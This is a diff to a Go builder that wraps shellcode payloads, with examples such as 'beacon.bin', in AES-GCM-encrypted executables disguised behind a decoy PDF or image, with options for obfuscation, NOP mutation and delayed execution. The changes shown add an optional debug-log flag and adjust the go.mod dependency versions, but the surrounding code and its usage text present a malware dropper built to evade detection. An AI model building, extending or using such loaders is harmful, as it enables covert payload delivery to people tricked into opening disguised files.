@@ -71,6 +71,7 @@ var (
 	enableObfuscate  = {{.EnableObfuscate}}
 	enableMutate     = {{.EnableMutate}}
 	delaySeconds     = {{.DelaySeconds}}
+	enableLog 		 = {{.EnableLog}}
 )
 
 // --------------------  新增：运行时版本判断  --------------------
@@ -181,6 +182,9 @@ type LASTINPUTINFO struct {
 var logFile *os.File
 
 func initLog() {
+	if !enableLog {
+        return // 日志被禁用
+    }
 	var err error
 	logFile, err = os.OpenFile("loader.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
 	if err != nil {
@@ -191,6 +195,9 @@ func initLog() {
 }
 
 func logf(format string, v ...interface{}) {
+	if !enableLog || logFile == nil {
+        return
+    }
 	if logFile != nil {
 		log.Printf(format, v...)
 		logFile.Sync() // 立即刷盘，方便 Win7 调试
@@ -1527,7 +1534,8 @@ type TemplateData struct {
 	EnableMutate     bool
 	EnableCompress   bool
 	DelaySeconds     int
-	HasRealDecoy bool
+	HasRealDecoy     bool
+	EnableLog        bool
 }
 
 func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
@@ -1580,6 +1588,7 @@ func main() {
 	enableMutate := flag.Bool("mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
 	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
 	delaySeconds := flag.Int("delay", 0, "Optional: Delay N seconds before payload execution.")
+	enableLog := flag.Bool("log", false, "Optional: Enable debug logging to loader.log file.")
 
 	// 自定义用法信息
 	flag.Usage = func() {
@@ -1598,6 +1607,7 @@ func main() {
 		fmt.Fprintf(os.Stderr, "Example:\n")
 		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
 		fmt.Fprintf(os.Stderr, "  %s -decoy image.jpg -payload calc.bin -out calc_loader.exe -obfuscate -mutate -delay 30\n\n", os.Args[0])
+		
 	}
 
 	// 检查帮助参数
@@ -1680,7 +1690,8 @@ func main() {
 		EnableMutate:     *enableMutate,
 		EnableCompress:   *enableCompress,
 		DelaySeconds:     *delaySeconds,
-		HasRealDecoy: hasRealDecoy,
+		HasRealDecoy:     hasRealDecoy,
+		EnableLog:		  *enableLog,
 	}
 
 	log.Println("[+] Generating loader source code...")
@@ -1717,11 +1728,11 @@ func main() {
 	goModPath := filepath.Join(tmpDir, "go.mod")
 	goModContent := `module temploader
 
-go 1.20
+go 1.19
 
 require golang.org/x/crypto v0.25.0
 
-require golang.org/x/sys v0.31.0 // indirect
+require golang.org/x/sys v0.22.0 // indirect
 `
 	if err := os.WriteFile(goModPath, []byte(goModContent), 0644); err != nil {
 		log.Fatalf("[-] Failed to create temp go.mod: %v", err)
@@ -1773,7 +1784,7 @@ require golang.org/x/sys v0.31.0 // indirect
 	log.Printf("[+] Building x64 version...")
 	output64 := absOutputFile
 	log.Printf("[+] x64 ldflags: %v", ldflags)
-	cmd64 := exec.Command("go", "build",  "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
+	cmd64 := exec.Command("go", "build", "-mod=mod", "-o", output64, "-ldflags", ldflags, filepath.Base(tmpfile.Name()))
 	cmd64.Dir = tmpDir
 
 	env64 := os.Environ()
